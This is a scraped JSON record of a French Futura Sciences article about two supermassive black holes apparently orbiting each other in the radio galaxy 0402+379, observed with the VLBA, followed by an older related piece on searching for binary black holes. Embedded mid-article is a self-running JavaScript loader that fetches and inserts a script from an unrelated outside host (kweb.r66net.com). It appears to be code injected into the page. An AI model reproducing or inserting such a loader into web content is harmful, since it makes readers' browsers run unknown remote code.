{"title": "Deux trous noirs supermassifs dansent l'un autour de l'autre", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-06-30", "content": "Dans le catalogue des radioastronomes, 0402+379 est une radiogalaxie qui semble posseder deux coeurs. Ce sont deux trous noirs supermassifs et les observations semblent bien montrer qu'ils sont en orbite l'un autour de l'autre. Ce qu'il faut retenir Les mouvements des astres nous renseignent sur la physique de la gravitation et c'est pourquoi il est interessant d'etudier ceux associes aux trous noirs. Depuis plus d'une decennie, des radioastronomes etudient deux trous noirs supermassifs au coeur d'une galaxie elliptique situee a environ 750 millions d'annees-lumiere du Soleil. Les donnees accumulees permettent de suivre les mouvements de ces astres et elles suggerent tres fortement qu'ils sont bien en orbite l'un autour de l'autre avec des caracteristiques orbitales que l'on est en train de preciser. Interview : un trou noir pourrait-il entrer en collision avec la Terre ?                       Un trou noir est une region de l'espace dont rien ne peut s'echapper, pas meme la lumiere. Il est donc naturel de se demander si ce type d'objet pourrait etre une menace pour notre planete. Futura-Sciences a interviewe Jean-Pierre Luminet, astrophysicien de renom, qui nous repond ici en video.                                        La decouverte des  etoiles binaires  a permis de tester la loi de la  gravitation  de  Newton  en dehors du  Systeme solaire  et, longtemps, les  mouvements  des  etoiles  de la  Voie lactee  et dans les autres  galaxies  sont eux aussi apparus conformes aux  equations  du fondateur de la  physique  classique. Ces faits ont fortement contribue a l'idee de lois universelles. Aujourd'hui, les physiciens ont des doutes, comme le prouve le developpement de la  theorie Mond . La theorie de la  relativite generale  a aussi remplace celle de Newton, en renouvelant au passage egalement le concept de trou noir, deja entrevu par Michell et Laplace a la fin du XVIII e  siecle. La theorie d' Einstein  peut etre testee, avec l'espoir de la depasser, par l'observation des mouvements d'etoiles autour du trou noir supermassif installe au coeur de la  Voie lactee . Elle pourrait aussi etre mise a l'epreuve grace a la detection d' ondes gravitationnelles  produites par deux  trous noirs supermassifs  qui fusionnent ou quand l'un d'eux avale une  etoile a neutrons . De tels phenomenes peuvent egalement servir a mettre a l'epreuve nos idees sur les trous noirs. Des trous noirs supermassifs sont tapis au coeur des galaxies et nous savons qu'elles fusionnent parfois. On devrait donc detecter des galaxies avec deux trous noirs supermassifs en  orbite  l'un autour de l'autre, se rapprochant d'abord lentement, mais inexorablement, de leur  coalescence . Quelques cas de tels systemes doubles ont ete reperes depuis une dizaine d'annees mais ces observations n'etaient pas  solides . Il semble qu'il en soit aujourd'hui tout autrement, comme le prouve une recente publication sur  arXiv . Sur cette image obtenue dans le domaine radio par le VLBA, apparaissent les deux trous noirs supermassifs, notes C1 et C2, accretant de la matiere, qu'ils chauffent et qui emet du rayonnement, visible a droite. (c) Bansal  et al. , NRAO/AUI/NSF                       Des trous noirs supermassifs separes par 24 annees-lumiere seulement Une equipe d'astronomes etats-uniens a en effet utilise le formidable pouvoir de resolution d'un  radiotelescope  bien connu, le VLBA ( Very Long Baseline Array ). Il s'agit en fait d'un instrument virtuel qui doit sa vue percante a la technique de  synthese d'ouverture  par  interferometrie . Il combine les observations de 10 antennes de 25 metres chacune, couvrant le territoire americain depuis Sainte-Croix, dans les Iles Vierges (Antilles), jusqu'au Mauna Kea de l'ile d'Hawai, dans l'ocean Pacifique. L'ensemble forme l'equivalent d'un radiotelescope dont le diametre serait de plusieurs milliers de kilometres.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Le VLBA leur a permis d'etudier patiemment depuis plus d'une decennie la radiogalaxie elliptique connue sous le nom de 0402+379. Elle est situee a environ 750 millions d' annees-lumiere  de la Voie lactee et avait deja fait parler d'elle en 2006 avec l'annonce de la decouverte d'un trou noir supermassif binaire dont les deux membres battaient le record de la plus courte distance de separation pour de tels objets, avec seulement 24 annees-lumiere environ. Les chercheurs ont donc affine les analyses des donnees collectees sur ce couple et ils confirment aujourd'hui qu'ils sont bien tres probablement en orbite. Ses caracteristiques commencent a etre bien connues. Les chiffres avances font etat d'une  periode orbitale  d'environ 24.000 ans et d'une  masse  totale de 15 milliards de masses solaires. Toutefois, trois a quatre ans d'observations sont encore necessaires pour aboutir a des conclusions fermes.  Les mouvements sont en effet tres lents, si l'on peut dire. La performance realisee par les astronomes avec le VLBA, en resolutions spatiale et temporelle, revient a reperer et mesurer le mouvement d'une grosse  fourmi  se deplacant a 1 cm/s a la surface d'une  exoplanete  en orbite autour de  Proxima du Centaure . Pour en savoir plus Un plan pour traquer les trous noirs supermassifs binaires Article de  Laurent Sacco  publie le 12/08/2011 Les trous noirs supermassifs, au centre des galaxies, se developperaient principalement grace a la coalescence de trous noirs non stellaires depuis des milliards d'annees. Pour etudier ce processus, il faut multiplier les observations de trous noirs massifs binaires dans des galaxies. C'est ce que souhaitent faire des chercheurs du  Kavli Institute for Particle Astrophysics and Cosmology . On ne sait pas tres bien comment sont apparus les premiers  trous noirs massifs  au coeur des galaxies, tout ce que l'on sait c'est qu'ils croissent de pair avec les galaxies. La theorie standard veut que ce soit a l'occasion de collisions entre  galaxies , avec  fusion , que la coalescence de leurs trous noirs centraux se produise. Ce serait la le processus le plus efficace pour obtenir les trous noirs supermassifs de plusieurs milliards de masses solaires aujourd'hui observes. Sur la gauche les observations << brutes >> de Chandra pour SDSS J171544.05+600835.7, au milieu une version traitee et a droite un modele ajuste a ces observations et montrant deux sources distinctes, probablement des trous noirs binaires supermassifs. (c) Brian Gerke-Greg Madejski                               On pense qu'il existe dans certains  amas globulaires  des trous noirs massifs, ne resultant pas de l' effondrement  d'une etoile. La aussi, lors de  collisions entre galaxies , de tels trous noirs pourraient etre phagocytes par le trou noir central. De fait, on connait des exemples de ces  trous noirs intermediaires  dans une galaxie. Un autre exemple de galaxie bien connu est  NGC 6240 , qui contenait elle-meme deux trous noirs supermassifs qui nous apparaissent sur le point de fusionner dans des millions d'annees. Toutefois, la theorie voulait que ce soit a l'occasion de ces fusions de galaxies que s'allument les  quasars . Les dernieres observations montrent que ce n'est pas le cas. Certains elements nous echappent donc encore dans le processus de croissance des trous noirs supermassifs. Davantage d'observations de galaxies avec des trous noirs formant des  systemes binaires  sont donc necessaires. Une strategie de recherche a ainsi ete mise au point, comportant trois etapes. Un extrait du documentaire du projet multiplateforme francophone sur la cosmologie contemporaine, Du Big Bang au Vivant. (c) Groupe ECP, www.dubigbangauvivant.com, Youtube Le test des rayons X La premiere etape consiste a eplucher les donnees fournies par le  Sloan  Digital  Sky Survey  pour y chercher des caracteristiques spectrales specifiques de galaxies contenant deux noyaux actifs, c'est-a-dire deux trous noirs centraux en train d'accreter de la  matiere  et emettant en consequence d'importantes quantites de lumiere. Une candidate a ete recemment trouvee, la galaxie SDSS J171544.05+600835. La deuxieme etape consiste a affiner les mesures en utilisant les  telescopes  du  Lick Observatory  et du  Keck  Observatory . Dans le cas de la galaxie precedente, elles ont revele qu'il semblait bien y avoir deux sources importantes de rayonnement separees par environ 6.800 annees-lumiere. La troisieme etape, celle qui est decisive, consiste a verifier que l'on est bien en presence de trous noirs geants sur le point d'accreter du  gaz . Pour cela, il faut conduire des observations en  rayons X  avec  Chandra . De fait, une signature qui peut s'interpreter comme la presence d'un trou noir binaire a effectivement ete obtenue dans le cas de la galaxie SDSS J171544.05+600835.7. Elle doit etre confirmee par d'autres observations de  Chandra . ", "theme": "sciences"}